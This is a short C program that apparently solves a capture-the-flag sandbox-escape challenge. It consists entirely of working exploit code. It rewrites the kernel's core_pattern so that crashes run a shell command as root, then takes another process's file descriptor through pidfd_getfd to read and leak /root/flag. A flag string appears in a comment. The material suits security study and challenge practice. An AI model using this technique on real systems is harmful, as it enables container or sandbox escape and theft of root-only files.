#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <syscall.h>
#include <unistd.h>
#define CORE_PATTERN "|/bin/sh -c /proc/%P/fd/3"
int main(int argc, char **argv) {
  (void)argc;
  if (strcmp(argv[0], "sandboxee") == 0) {
    int fd = open("/proc/sys/kernel/core_pattern", O_RDWR);
    write(fd, CORE_PATTERN, strlen(CORE_PATTERN));
    close(fd);
  } else {
    int pid = atoi(argv[0] + 6);
    int pidfd = syscall(SYS_pidfd_open, pid, 0);
    int fd = syscall(SYS_pidfd_getfd, pidfd, STDOUT_FILENO, 0);
    int flag_fd = open("/root/flag", O_RDONLY);
    char flag[512];
    int n_read = read(flag_fd, flag, sizeof(flag));
    write(fd, flag, n_read);
    /* CTF{expl0i1_glob4l_kernel_limi15} */
  }
}